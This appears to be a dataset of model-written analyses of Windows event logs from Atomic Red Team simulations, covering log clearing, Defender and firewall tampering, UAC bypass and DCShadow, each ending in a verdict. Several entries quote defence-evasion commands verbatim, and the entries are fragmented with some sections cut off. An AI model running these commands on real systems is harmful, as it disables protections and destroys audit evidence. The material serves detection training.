This resolution is based on the pattern and series of event activities which suggest a compromise of the CEO's machine, involving log clearing and potential unauthorized data handling."
Rundll32 setupapi.dll Execution,"Upon reviewing the provided logs, the following observations can be made:

1. **Common Process Executions and Elevated Permissions:**
   The logs include multiple invocations of `wevtutil.exe`, which is used to clear event logs. This is evident from the command lines like `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`, among others targeting different logs including System, Application, and Security logs. The frequent execution of `wevtutil.exe` by the `admin_test` user with high integrity level is unusual and suspicious, particularly because it spans multiple event channels within a short time frame (approx 1 second).

2. **Suspicious Command Executions:**
   The logs showcase a suspicious execution via `cmd.exe` that includes `rundll32.exe` to launch `setupapi.dll`. This is typically associated with executing dynamic link libraries (DLLs) and, in this context, running a `.inf` file from a temporary path, which is generally used for temporary and often malicious purposes.

3. **Event Log Clear Actions:**
   `EventID 1102` in the Security log and `EventID 104` in the System log indicate that the logs have been cleared by the `admin_test` user. This is a known tactic utilized by malicious actors to cover their tracks, aiming to delete evidence of their unauthorized or malevolent actions on the system.

4. **Indicators of Malicious Testing Frameworks:**
   The presence of an Atomic Red Team artifact (`AtomicRedTeam\\T1218.011`) hints at simulation of adversarial tactics, techniques, and procedures (TTPs). While Atomic Red Team is a security tool used for simulating attacks and blue team training, its presence in an operational environment without a clear and legitimate purpose can indicate potential misuse or an unapproved simulation attempt. 

Given these observations, it is reasonable to assert that the logs exhibit suspicious behavior due to the combination of event log clearing, the use of legitimate Windows utilities in a potentially malicious manner, and the indication of an adversarial simulation tool. These actions demand further investigation and verification to understand the intent—whether it is with a legitimate purpose (e.g., blue team training) or with malicious intent.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Immediate Containment**: Isolate the system to prevent any potential further actions by a malicious actor.
- **Investigate User Actions**: Verify if the `admin_test` user had a legitimate reason for executing these commands or if the account has potentially been compromised.
- **Review Security Policies and Recent Changes**: Ensure any blue team exercises or security tools like Atomic Red Team were authorized and documented.
- **Enhanced Monitoring**: Increase monitoring on critical systems and accounts for similar activities, particularly focus on event log clearance and rundll32 usage.
- **Incident Response Engagement**: Engage an incident response team to conduct a full forensic investigation and determine the full scope and intent behind the observed suspicious activities."
Event Viewer Registry Modification - Redirection URL,"After analyzing the provided event logs, several findings stand out:

1. **Event Log Clearing**:
   - Both security and system logs have been cleared around the same timestamp (""2024-10-24 16:59:48"") by a user ""admin_test"". The `wevtutil.exe` command-line utility was used to clear logs from multiple channels (Sysmon, Application, Windows PowerShell).

2. **Suspicious Registry Modification**:
   - A suspicious command was executed using `cmd.exe` to modify the Windows registry. The command line is: 
     ```
     ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""file://C:\windows\system32\notepad.exe"" /f
     ```
   - This indicates an attempt to set a redirection in the Event Viewer through a registry key.

3. **High Integrity Level Processes**:
   - Processes were executed with high integrity, including commands like `wevtutil.exe`, `whoami.exe`, and others. This level of privilege may indicate attempts to carry out actions requiring administrative access.

4. **Process Execution Patterns**:
   - The execution of `whoami.exe` appeared multiple times with high integrity levels, often tied to `wsmprovhost.exe`.
   - The clearing of event logs is notably performed using `wevtutil.exe`, indicating efforts to conceal actions.

5. **Microsoft Edge Update Activity**:
   - There are numerous activities related to Microsoft Edge Update processes. While EdgeUpdate activities are not inherently malicious, the timing and context warrant further scrutiny.

### Assessment
- **Suspicious Behavior**: The clearing of event logs is a red flag. It is a typical indicator of someone attempting to cover their tracks after executing potentially malicious activities. The registry modification via `cmd.exe` adds another layer of suspicion.
- **Potential Compromise**: The use of administrative privileges to perform these actions suggests unauthorized or malicious intent to manipulate system integrity and security visibility.

### Conclusion
**Resolution**: MALICIOUS

Based on:
- The deliberate clearing of critical logs.
- Suspicious registry editing aimed at modification of Event Viewer behavior.
- Frequencies and patterns of high-privilege process executions.

- **EventID: 4624 and 4634**: These events capture successful logons and logoff activity for `admin_test` using NTLM authentication, which is worth scrutinizing, given the log clearance that follows. The use of NTLM from an external workstation (`DESKTOP-3HL5B2P`) could raise additional concerns about unauthorized access.

#### 3. **Command Execution Suspicion**
- **Registry Modification**: A command was executed to modify the registry (`cmd.exe` executed `reg add`) in `Sysmon EventID: 1` which suggests configuration changes that aren't typical for regular operations and could be nefarious, attempting to alter user policies covertly.
- **Process Anomalies**: There are multiple instances of processes such as `wevtutil.exe` that have cleared logs, under the context of `admin_test`. This process activity corroborated by entries in the Sysmon log, matches the time and user context of the log clearance events, further indicating malicious intent.

#### 4. **Time Discrepancy Events**
- **EventID: 4616**: Shows the system time being reset. While not immediately suspicious on its own, combined with log clearance and `admin_test` activity, it may suggest an attempt to manipulate or obfuscate event timing, a known tactic in adversary behavior to mask activity.

### Assessment and Resolution

Windows - Timestomp a File,"### Detailed Analysis of Logs

#### Suspicious and Anomalous Behavior

1. **Log File Clearing Events**: 
   - Multiple instances of log files being cleared are noted in the system, security, and PowerShell channels. Events with ID 104 and 1102 indicate that logs for these channels were cleared by the user ""admin_test"" on the machine SERVER002. This is generally a tactic used by an attacker to hide their tracks after malicious activity.

2. **Use of PowerShell with External Script**:
   - The PowerShell logs indicate the execution of a PowerShell script using the `timestomp.ps1` from an `AtomicRedTeam` directory. The `timestomp` utility is typically used in offensive security operations to alter file timestamps, which is often a means of affecting the evidence timeline on compromised systems.

3. **Abnormal Process Executions**:
   - Execution of `wevtutil.exe` with command lines to clear event logs across multiple channels is noted. This is highly indicative of an attempt to cover traces.
   - A sequence of processes including `wevtutil.exe`, `powershell.exe` invoking suspicious modules, and typical reconnaissance tools like `whoami.exe` are all executed by the user ""admin_test"". These actions are consistent with malicious behaviors such as information gathering and anti-forensic techniques.

#### Indicators of Malicious Activity

- **Process Execution Hierarchy**: The evidence shows `wevtutil.exe` being executed to clear event logs. This action was followed by the execution of timestomping scripts in PowerShell. The correlation between the clearing of logs and the execution of timestomp suggests an organized attempt to obfuscate malicious operations.

- **External Tools and Payload Execution**: Utilization of an external payload like `timestomp.ps1` located in a non-standard directory (i.e., `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..`) strongly indicates malicious use since these tools are associated with known offensive security testing repositories or frameworks.

#### Threats and Risks Identified

- **Persistence and Evasion**: The combination of log clearing, use of timestomp, and PowerShell is a strong indication of a sophisticated attempt to establish persistence and evade detection.
- **Potential Data Compromise**: The host being used for such actions presents risks of being a pivot point for further malicious activities like data exfiltration or lateral movement across the network.

### Assessment and Resolution

Uninstall Sysmon,"Based on the provided Windows event logs, here is a detailed analysis:

1. **Security Log:**
   - The event from the security log indicates that the event logs were cleared. The Event ID 1102 shows that a user named ""admin_test"" cleared the logs on Server002. This action is suspicious, especially on a high-value target like the CEO's machine, as it is commonly associated with attempts to cover tracks after conducting illicit activity.

2. **Application Log:**
   - The application log entries show two events with the provider ""edgeupdate"" and the message ""Service stopped"". While stopping services can be routine, it can sometimes be associated with attempts to temporarily disable protective measures or services to carry out unauthorized activities.
   - Additionally, there is an entry for the Software Protection Platform Service, but it appears to be a routine event noting a rule check, not necessarily suspicious on its own.

3. **System Log:**
   - Event ID 104 in the system log indicates that the event logs (specifically the System and Windows PowerShell logs) were cleared by the same ""admin_test"" user on Server002 immediately around the same time as the logs in the Security channel were cleared.
   - Log clearing on multiple channels indicates that someone with administrative access, ""admin_test"" in this case, is intentionally removing logs from the machine, which reinforces the suspicion of malicious intent.
   - The FilterManager logs seem routine with the device name ""SysmonDrv"" and do not, by themselves, indicate suspicious behavior, but they coincide with the timing of other concerning activities.

**Assessment:**
The consistent pattern of log clearing by the ""admin_test"" user across multiple log sources is highly suspicious. Log clearing is not typical for routine administrative tasks and is often a sign of malicious activities, especially post-exploitation to hide traces of unauthorized or harmful actions.

**Threats/Risks Identified:**
- Potential compromise of the CEO's machine due to unauthorized access and log clearing.
- Possibility that log clearing was used to hide the execution of illicit commands, data exfiltration, or deployment of malware.

**Guidance on Proceeding:**
- Further investigation is needed to examine recent processes, file creation/deletion, and any network connections during this timeframe.
- Inspect user accounts and authentication logs for anomalous access patterns for the ""admin_test"" account.
- Review EDR alerts or any other security solutions for more context on potential activities during this period.
- Increase monitoring of this machine and consider isolating it for forensic analysis if further suspicious activity is observed.

**Final Resolution: SUSPICIOUS** 
The logs contain activity that doesn't look right and needs more investigation. Further analysis is necessary to determine the full extent of any compromise and to ensure that any underlying issues are resolved."
Tamper with Windows Defender ATP PowerShell,"Upon analyzing the provided Windows event logs, several observations can be made regarding suspicious behavior or potential indicators of compromise:

This activity is unusual and indicates an attempt to disable security mechanisms, which is often aligned with malicious behavior.

**2. Windows Defender State Change:**
   - The Application logs indicate that Windows Defender's state has been set to ""SECURITY_PRODUCT_STATE_SNOOZED,"" further suggesting that the antivirus features have been intentionally disabled.

**3. Event Log Clearing:**
   - The Security log shows an event with EventID 1102 indicating that the audit logs were cleared. This action, especially if it was unauthorized or unexpected, can be an attempt to cover tracks post-compromise.

**4. System Time Manipulation:**
   - The Security log events (ID 4616) and System log events indicate a time change, which can be a tactic used to mislead digital investigations and hide temporal markers of suspicious activity.

Based on these findings, the activity observed within these logs is consistent with malicious intent, particularly due to the disabling of security features, event log clearing, and time manipulation. These actions suggest an attempt to evade detection and cover tracks, potentially indicating a compromise or intrusion.

Remove Administrative Shares,"Upon analyzing the provided Windows event logs, several points of concern regarding potential malicious activity have been identified:

1. **Log File Clearing:**
   - The `System`, `Windows PowerShell`, and `Security` event logs were cleared by the user `admin_test` right before or during suspicious activity. This is indicated by the presence of `EventID: 104` in the System log and `EventID: 1102` in the Security log. Clearing event logs is often a tactic used by an attacker to conceal their tracks, making this particularly concerning.

2. **Suspicious Command Execution:**
   - A command was executed via `cmd.exe` that included deleting default administrative shares (C$, IPC$, ADMIN$) using the command `net share %%i /delete`. This is suspicious behavior as it indicates an attempt to modify or restrict access to administrative resources. Administrative share deletion (especially in a loop) is not a typical behavior of benign processes and could imply a potential backdoor cleanup or malicious activity.

3. **Inappropriate Use of `wevtutil`:**
   - The `wevtutil.exe` command was used multiple times with the `cl` argument, which indicates clearing event logs (System, Application, and Security). This is suspicious, as it aligns with tactics used to erase evidence of malicious activity.

4. **Multiple Process Executions:**
   - There are a series of process executions originating from `cmd.exe` and including various network commands (`net.exe` and `net1.exe`) and the `wevtutil.exe`. Frequent and rapid invocation of these processes combined with event log clearing further raises suspicion about malicious activities.

5. **Exeuction of Sensitive Commands:**
   - Processes like `whoami.exe` and `hostname.exe` were invoked, which can be used to gather environment information typically seen in the reconnaissance phase of an attack.

Considering these findings, the logs indicate potential deliberate malicious activity characterized by:
- Clearing of logs to hide operational footprint.
- Execution of commands aimed at altering or deleting system shares and records.
- Use of built-in administrative utilities to achieve persistence or cover tracks.

**Assessment:**
Based on the analysis of log files indicating log clearing actions by `admin_test`, suspicious command execution that involved deleting system administrative shares, and the execution of utilities like `wevtutil.exe` in a manner consistent with log clearing, the overall activities exemplify typical behaviors associated with malicious intent.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Response:**
   - Isolate the affected machine (e.g., `Server002`) from the network to prevent further malicious activity.
   - Conduct a thorough forensic analysis to determine the scope and source of the compromise.
   - Change credentials for `admin_test` and any other potentially compromised accounts.

2. **Evidence Gathering:**

WMIC Tamper with Windows Defender Evade Scanning Folder,"Based on the provided Windows event logs, here is a detailed analysis of the situation with emphasis on any suspicious behavior that may indicate malicious activity:

### Suspicious or Anomalous Behavior
1. **Clearing of Event Logs**:
   - There are multiple entries in both the System and Security logs indicating that the `admin_test` user cleared event logs for channels such as ""System,"" ""Windows PowerShell,"" and ""Security."" The events with IDs 104 and 1102 show log file clearances which are generally suspicious actions, especially if not performed as part of routine maintenance and by a user like `admin_test` who is presumably working manually.

2. **Execution of WEVTUTIL**:
   - Multiple executions of the `wevtutil.exe` process are recorded in the logs, with commands for clearing logs such as ""Microsoft-Windows-Sysmon/Operational"" and ""System."" `wevtutil.exe` is a legitimate Windows utility, but its successive usage, particularly clearing logs, raises suspicions of an attempt to cover tracks.

3. **WMIC Command**:
   - There's a recorded command (`wmic.exe`) being executed that attempts to add an exclusion path to Windows Defender. The command is `wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\""ATOMICREDTEAM\""`. This is a known tactic that attackers use to bypass security controls by adding malicious paths as exclusions in antivirus software.

4. **Time Change**:
   - Time change logs (Event ID 4616) indicate system time manipulation. Altering system time can be indicative of malicious intent, often used to align log timestamps with attacker activities or evade time-based detection mechanisms.
   
5. **Potential Reconnaissance**:
   - Execution of `hostname.exe` and `whoami.exe` suggests possible reconnaissance activities, often seen in the initial stages of compromise to gather information about the host and the logged-in user context.

### Assessment of Malicious Activity
- The persistence of `wevtutil.exe` activity for clearing logs, the critical WMIC command to manipulate Windows Defender settings, and log file clearances by the `admin_test` user are strong indicators of potentially malicious activity. The execution patterns, particularly invoking administrative utilities to cover traces and alter system configurations, align with techniques used in real attack scenarios.

### Conclusion
The reviewed log entries do point towards unauthorized and potentially malicious activity aimed at tampering with system configurations and covering the attacker’s tracks by clearing log files. Given the comprehensive sequence of events and the nature of the operations logged, it is highly indicative of malicious activity.

**Resolution: MALICIOUS**

### Guidance on How to Proceed

- **In-Depth Forensic Analysis**: Conduct a deeper investigation into the system and network logs to identify further indicators of compromise (IoCs) and possible lateral movement.
- **Review Access Logs**: Check both local and network authentication logs to trace any suspicious activities or off-policy access attempts.
- **Password Changes**: Enforce a password reset policy for sensitive accounts, especially those like `admin_test`.
- **System Restoration**: Consider restoring the compromised system from a known-good backup after ensuring all malicious access points are closed.
- **Security Audit**: Perform a comprehensive security audit to identify any vulnerabilities that could have been exploited and to improve overall security posture.
- **Education and Training**: Provide awareness training to users on recognizing potential security threats and best practices in handling sensitive operations.

By taking these actions, it will help mitigate the current threat and enhance defenses against future security incidents."
Disable Microsoft Defender Firewall,"Upon analyzing the provided Windows event logs, there are several activities that need to be investigated further to determine if they are malicious:

1. **Logs Cleared**: There are multiple ""LogFileCleared"" events (`EventID 1102` in the Security log and `EventID 104` in the System log). The clearing of event logs can be an indicator of malicious behavior, as attackers often clear event logs to cover their tracks. These events are initiated by the user ""admin_test.""

2. **Use of `wevtutil.exe`**: The `sysmon` logs show multiple instances of the ""Eventing Command Line Utility"" (`wevtutil.exe`) clearing the logs for various channels (Application, System, and Security). This further corroborates the concern of log tampering.

3. **Suspicious Command Execution**: Within the `sysmon` logs, there's a command executed using `cmd.exe` to disable the firewall (`netsh advfirewall set currentprofile state off`). This is carried out by the user ""admin_test."" Disabling the firewall can be an indicator of malicious intent, as it reduces the security posture of the system and can allow unauthorized access or data exfiltration.

4. **Privilege Escalation**: There's an event log indicating a privileged logon (`EventID 4672`), where the user ""admin_test"" is granted several high privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). This elevated privilege can be a red flag if not justified, suggesting potential privilege abuse.

5. **Time Manipulation**: The `Kernel-General` events (`EventID 1` and `EventID 24`) indicate potential time manipulation activities. Unusual time changes can be used to evade detection mechanisms that rely on timestamps.

**Assessment**: 
The combination of these activities - especially the clearing of logs following the disabling of the firewall, and privileged actions - strongly points toward suspicious and potentially malicious behavior. The attempt to clear logs is a common tactic used by adversaries to hide their operational tracks.

**Resolution**: **MALICIOUS**
The logs analyzed reveal strong indicators of malicious intent, involving log tampering, disabling system protection mechanisms (firewall), and executing actions with elevated privileges. 

**Guidance on How to Proceed**:
- **Immediate Containment**: Isolate the affected system to prevent further unauthorized access.
- **Thorough Investigation**: Perform a full forensic investigation to understand the scope and entry point of the compromise.
- **Audit User Accounts**: Review and audit the activities of the user account ""admin_test"" and other privileged accounts.
- **Deploy Preventive Measures**: Implement enhanced logging, monitoring, and alert mechanisms to detect and respond to such events in the future.
- **Security Patch and Update**: Ensure that systems are up-to-date with the latest security patches.
- **User Awareness and Training**: Conduct user training sessions to reinforce security best practices.

By taking these steps, you can address this breach and bolster defenses against future incidents."
UACME Bypass Method 39,"Upon analyzing the provided Windows event logs, the following observations and analysis can be made:

### Suspicious and Anomalous Behavior:

1. **Event Log Clearing:**
   - Multiple instances of event logs being cleared using the `wevtutil.exe cl` command are observed. This includes clearing of System, Security, and PowerShell logs. This activity is performed by the user `admin_test`.

2. **Use of Potentially Malicious Tools:**
   - The logs show execution of a known tool for privilege escalation, `uacme` Akagi64.exe, which resides in the directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\uacme`.
   - The command-line arguments used in the execution appear to mimic a known red teaming and penetration testing toolset (Atomic Red Team).

3. **Process Execution Patterns:**
   - The process `cmd.exe` is seen executing commands related to the above-mentioned suspicious tool.
   - Processes being initiated under a user context with high integrity level, typically indicative of administrative privileges.

4. **Security Event Log Clearing:**
   - EventID 1102 indicates the Security log has been cleared, which is a direct indicator of malicious intent to cover tracks after conducting unauthorized activities.

5. **Use of System Level Tools:**
   - Tools such as `whoami.exe` and `hostname.exe` are executed, suggesting enumeration activities.

### Assessment of Malicious Activity:

- The combination of clearing logs, executing known malicious tools (`uacme`), conducting system enumeration, and log deletion suggests a strong attempt at privilege escalation and maintaining stealth.
- The `cmd.exe` execution to run Akagi64.exe directly relates to known attack vectors for bypassing User Account Control (UAC).
- The sequence and timing of the events (log cleared shortly after the suspicious activities) enhance the likelihood of malicious activity taking place.

### Resolution: MALICIOUS

The evidence strongly suggests that the activities logged are malicious in nature. There is clear intent to use tools for unauthorized access and privilege escalation, followed by attempts to cover the tracks by deleting the log entries.

### Recommended Actions:

1. **Immediate Incident Response:**
   - Isolate the affected system (`Server002`) to prevent further unauthorized access.
   - Collect and preserve all logs and any further evidence for detailed forensic analysis.

2. **Containment and Eradication:**
   - Revoke administrative privileges of the `admin_test` account across all systems until a complete investigation is conducted.
   - Perform a thorough scan of the system for additional malicious artifacts.

3. **Recovery:**
   - Restore affected systems from a known good backup, ensuring no trace of the unauthorized tools or activities persists.
   - Change all relevant access credentials, especially for sensitive accounts.

4. **Review and Reinforce Security Policies:**
   - Implement stricter logging and monitoring policies, ensuring logs are frequently backed up and are write-protected.
   - Educate personnel about potential indicators of compromise and regular security best practices.

5. **Further Investigation:**
   - Conduct a thorough investigation to understand the initial vector of the breach and assess if other systems might be compromised as well.

The activity logs present a typical scenario of compromise involving privilege escalation tools and forensic evasion techniques."
InstallUtil class constructor method call,"### Detailed Analysis of Logs

The review of the provided logs reveals several notable details, which align with potential malicious activity indicators:

1. **Log Clearing Activity**:
   - **Event Logs Cleared**: The logs indicate several instances of event logs being cleared (EventID 104 in System log and EventID 1102 in Security log). The clearing of logs is usually a red flag, especially when done by a user or account that may not typically engage in such activities. This may suggest an attempt to cover up malicious or unauthorized actions.
   - **User Involved**: The logs were cleared by `admin_test`, a user account that seems to have administrative privileges.

2. **Suspicious PowerShell Activity**:
   - **PowerShell Script Execution**: The PowerShell log indicates that a script from the Atomic Red Team directory, specifically related to `T1218.004`, was executed. This is a well-known technique used for defense evasion by abusing `InstallUtil`.
   - **Console Host**: Multiple processes initiated via PowerShell were tied to potentially risky command line arguments, reflecting execution of potentially malicious scripts.
   - **Scripts Involved**: The execution of the `InstallUtilTestHarness.ps1` script potentially indicates testing or deploying of evasive techniques.

3. **Sysmon Logs**:
   - **Process Executions**: Multiple instances of `wevtutil.exe` (a tool for managing event logs) being executed are logged, including commands that clear event logs. This activity correlates with the log clearing events seen and is suspicious considering the context (especially done under the `admin_test` account).
   - **Microsoft's Edge Update Modules**: Several instances of Microsoft Edge Update executable processes are logged under the SYSTEM account. While this might initially appear routine, the timing in conjunction with the audit logs suggests they may attempt lateral movement or persistence establishment, or they might be noise trying to mask malicious activities.

4. **Time Manipulation Attempts**:
   - **Time Change Event**: Events around time modification can indicate attempts to subvert time-based detection mechanisms or log integrity. The presence of modified times in the system logs aligns with techniques attempting to bypass security monitoring.

### Assessment of the Situation

The combination of administrative log clearing, execution of potentially evasive scripts via PowerShell, and the suspicious use of system binaries like `wevtutil.exe` and `svchost.exe` under administrative contexts and SYSTEM privileges, can be considered consistent with malicious actions typically taken during a cybersecurity breach attempting to evade detection. The presence of Atomic Red Team activities further raises suspicion as it directly relates to exploitation or testing of specific red team tactics, which should be closely monitored within corporate or secure environments.

### Resolution

**MALICIOUS** - The logs present strong indicators of malicious activity, involving log tampering, PowerShell execution of known security evasion scripts, and suspicious behavior by administrative accounts. Immediate action is recommended.

### Guidance on How to Proceed

Allow Executable Through Firewall Located in Non-Standard Location,"Upon analyzing the provided logs, the following observations have been noted that could indicate potential malicious activity on the Windows host:

### Analysis of Logs

#### System Log
1. **Event IDs 104 and 1102**: These events indicate that the logs on the machine were cleared, which is an action often associated with attempts to cover up traces of malicious activity. The user ""admin_test"" performed these actions almost simultaneously across different log channels (System, Windows PowerShell, Security), which is highly suspicious.

2. **Frequent Use of `wevtutil`**: The logs indicate that `wevtutil.exe` is being used with the clear command to clear event logs, which correlates with the mentioned Event IDs. This is a direct indicator of potentially malicious activity aimed at log tampering.

#### Windows PowerShell Log
1. **PowerShell Command Execution**: A PowerShell script involving copying an executable (`AtomicTest.exe`) to a user directory and modifying firewall rules (`netsh advfirewall`) is executed. The use of `AtomicTest.exe` is particularly suspicious as it is linked to Atomic Red Team tests, which are simulations of known adversary behavior for detection testing.

#### Sysmon Log
1. **Process Execution**: The execution of `PowerShell.exe` with command lines related to copying the suspicious `AtomicTest.exe` and altering firewall rules aligns with activities often seen in penetration testing or real attacks trying to manipulate network access.

2. **High Integrity Level**: The command executions, especially those involving `wevtutil.exe`, are occurring under a high integrity level, indicating they might have been executed with elevated privileges or administrative rights.

### Threat Assessment

- **Log Clearing**: The act of clearing logs is a significant indicator of malicious behavior intended to hide tracks. This requires deliberate intent and usually involves administrative privileges. 

- **Unusual PowerShell Activity**: The execution of PowerShell scripts to manipulate system files and firewall rules is common in sophisticated attacks, especially to establish persistence or manipulate the system’s defensive capabilities.

- **Privilege Levels and Executions**: The combination of executing tasks with high integrity levels and the nature of tasks performed (log clearing, file transfers with PowerShell, firewall rule manipulation) suggests misuse of administrative powers.

### Conclusion

Given the above analysis, based on events such as log clearing, use of PowerShell for potentially risky operations, and the nature of the processes being executed, the situation is assessed as:

**Resolution: MALICIOUS**

### Recommended Actions

1. **Immediate Containment**: Isolate the host from the network to prevent any further potential malicious activities or lateral movement within the environment.

2. **Forensic Analysis**: Perform a thorough forensic analysis to understand the scope of the intrusion, determine how access was gained, and identify any additional compromised systems.

4. **Audit and Monitoring**: Implement enhanced monitoring on critical systems and user accounts, especially those with administrative privileges, to detect similar activities in the future.

5. **Review and Strengthen Security Posture**: Consider tightening security controls, such as restricting the use of PowerShell, implementing application whitelisting, and reviewing administrative account usage policies."
LockBit Black - Use Registry Editor to turn on automatic logon -cmd,"### Detailed Analysis of the Logs:

1. **Process Execution & Command Line Analysis:**

   - **Wevtutil.exe Usage:**
     - The presence of `wevtutil.exe` is notable as it is used for managing event logs. Its repeated execution with commands like `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, and `cl Security` at high integrity levels suggests that event logs are being cleared.
     → Normally such activities could indicate an attempt to cover tracks after a malicious operation.

   - **Command Line Utilities:**
     - The usage of command-line utilities such as `whoami.exe` and `hostname.exe` are common for user and system information retrieval. However, their execution in sequence could be part of a reconnaissance phase within a broader attack context.

   - **Registry Modifications via CMD:**
     - `cmd.exe` is being used to run registry modifications that involve enabling `AutoAdminLogon` and setting a username, domain, and password.
     → This can be a sign of persistence and unauthorized backdoor access set by potentially malicious actors.

2. **Log Clearing Activities:**

   - **Event 104 from the System Log:**
     - The events indicate that the system logs and PowerShell logs have been cleared as evidenced by event ID 104. The user `admin_test` appears to be responsible for this action.
     → This could be a deliberate attempt to delete audit trails.

   - **Security Log Clearance:**
     - The security log shows event ID 1102 indicating the clearance of security logs. This action carries significant weight as it suggests someone with admin capabilities is trying to hide malicious activity. The same user `admin_test` is linked to these events.

3. **Time Event Manipulation:**

   - **Time Change Events:**
     - Events showing a time change are present, executed by `svchost.exe`. Although not directly indicative of malicious activity, any alteration in system time should be investigated as it may support other malicious actions meant to alter logs and timestamps.

4. **EDR Alerts on CEO’s Machine:**

   - The combination of registry manipulation, log clearance, and system reconnaissance on a critical endpoint such as the CEO’s machine is a red flag. Together, they strongly indicate an attempt to establish undetected system changes, stealth access, and clean exit strategies by a malicious actor.

### Assessment & Resolution:

#### **Resolution: MALICIOUS**

The activities observed in the logs — clearing of event logs, registry changes to enable auto logon with credentials, and sequential use of system utilities — provide strong indicators of malicious intent. These actions suggest someone is trying to establish persistent unauthorized access while covering their operational tracks, typical in sophisticated attacks.

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Disconnect the affected host (CEO machine) from the network to prevent further potential damage.
   - Change all passwords related to accounts used by the host and potentially affected domains.

2. **Forensic Investigation:**

   - Train staff on detecting social engineering attempts, especially those that could lead to credential exposure."
Windows HideSCAPower Group Policy Feature,"Upon reviewing the logs provided, several indicators of potentially malicious activity are identified. Here is a breakdown of the analysis:

1. **Log Cleared Events**:
   - The Security event log contains an entry (EventID 1102) indicating that logs were cleared by a user named ""admin_test"". This action, particularly by a privileged user account, often suggests attempts to remove traces of activity that could be investigated.
   - Similarly, the System log entry (EventID 104) also indicates that logs in the System and Windows PowerShell channels were cleared by the same user within a similar timeframe. This is suspicious and possibly aimed at covering tracks.

2. **Command-Line Activity**:
   - The Sysmon logs show multiple executions of `wevtutil.exe` with the command-line arguments `cl` aimed at clearing logs from the Microsoft-Windows-Sysmon/Operational, Application, System, Security, and Windows PowerShell logs. The repeated clearing of these logs is a strong indicator of an attempt to hide activities.
   
3. **Registry Key Modification**:
   - There is an event where `cmd.exe` is used to modify a Windows registry key (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`) to hide system controls. This type of registry manipulation, especially when done in conjunction with log clearing, suggests an attempt to obfuscate or control system behavior legitimately.

4. **Process Creation Patterns**:
   - The processes initiated by ""admin_test"" using administrative-level privileges include common Windows utilities often leveraged in malicious activities. For example, `whoami.exe` and `hostname.exe` executions could be used for system reconnaissance.
   
5. **Privilege Escalation Indicators**:
   - The use of system-level integrity in some of the logs implies actions executed with elevated privileges. The execution context of `NT AUTHORITY\SYSTEM` is typical for administrative-level activities but when combined with other suspicious actions, it can suggest potential privilege escalation.

6. **Edge Update Activity**:
   - Activity involving Microsoft Edge Update processes seems relatively routine but should be checked against known update schedules or potential exploitation of vulnerabilities in update mechanisms.

**Assessment**: Given the collected evidence, particularly the clearing of the logs by an administrator using `wevtutil.exe` and the registry modification attempt, these logs show signs of potentially malicious behavior.

**Resolution**: MALICIOUS

**Guidance**: 
- Initiate a thorough forensic investigation on the host. Look for other indicators of compromise and external connections.
- Examine user ""admin_test"" activities for legitimate versus unauthorized actions.
- Implement monitoring for further suspicious activities.
- Assess if any sensitive data was accessed or exfiltrated during the time windows observed.
- Enhance logging configurations to prevent easy clearing and ensure a reliable logging mechanism to detect and flag such activities immediately in the future."
DCShadow (Active Directory),"Upon analyzing the provided Windows event logs, several indicators of potentially malicious activity have been identified. Below is a detailed analysis:

1. **Use of Mimikatz and DCShadow:**
   - There are clear indications of Mimikatz being executed along with DCShadow activities. The command-line arguments detail the manipulation of Active Directory objects, specifically targeting the `bruce.wayne` object and altering attributes like `badpwdcount` via DCShadow, which is a technique used to push changes to a domain controller without direct permission. This type of activity is clearly malicious.
   - The execution of `PsExec.exe` with administrative privileges and Mimikatz is consistent with attempts to perform credential dumping or similar malicious activities.

2. **System Event Log Clearing:**
   - Logs indicate that the event logs for System and Security have been cleared, which is a classic technique used by attackers to hide their tracks post-compromise.

3. **Execution of Wevtutil to Clear Logs:**
   - Multiple instances of `wevtutil.exe` running with the `cl` (clear logs) command targeted at system logs like 'System', 'Security', and others. This action is highly suspicious and generally indicative of malicious activity aimed at covering tracks.

4. **High Integrity Level Execution:**
   - Many processes are executed with a High Integrity Level, suggesting elevated privileges were obtained, likely through privilege escalation.

5. **Use of Temporary Directories and Unsigned Scripts:**
   - The execution context stems from temporary directories, which is unusual for legitimate administrative activities, especially those manipulating Active Directory settings using highly sensitive operations like DCShadow.

6. **Presence of Sysmon Alerts:**
   - Sysmon alerts correlate and highlight unusual process creations and image loads, which all lead back to administrator-level malicious actions.

### Assessment

Based on the identified behaviors—use of Mimikatz, attempts to manipulate AD objects without proper authorization, clearing of system logs to cover tracks, and the general command-line usage context—it is conclusive that the logs indicate a malicious activity indicating a potential compromise of the CEO’s machine or domain-level compromise attempts.

### Resolution

**MALICIOUS** - The logs contain activity that can be 100% characterized as malicious.

### Guidance on How to Proceed

Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell,"## Detailed Analysis

### Suspicious and Anomalous Behavior
1. **PowerShell Execution:**
   - There is an execution of `powershell.exe` with a command to modify registry keys related to Windows Logon (`AutoAdminLogon`, `DefaultUserName`, `DefaultDomainName`, and `DefaultPassword`). This is a significant red flag indicating intentions for automatic logons, potentially with malicious intent.

2. **Clearing of Event Logs:**
   - The security log (Event ID 1102) and the system log (Event ID 104) show that logs were cleared. This action is suspicious as it's often used to hide malicious activities.
   - The clearing was performed by a user `admin_test`, and the process responsible had the command line utility `wevtutil.exe` as its parent. This adds additional suspicion as clearing logs via this utility could indicate an attempt to cover tracks.

3. **Command-Line Utility (wevtutil.exe):**
   - The use of `wevtutil.exe` multiple times suggests active engagement with the event logs, either inspecting or managing them manually, which can be abnormal for regular operations.

4. **Process Integrity Levels:**
   - Most processes were executed with High Integrity Level, indicating administrative privileges, which supports the potential risk concerning privilege misuse.

5. **Console Host (conhost.exe):**
   - Multiple executions of `conhost.exe` linked to system utilities like `whoami.exe`, which show a pattern of checking user contexts and potentially related to reconnaissance activities.

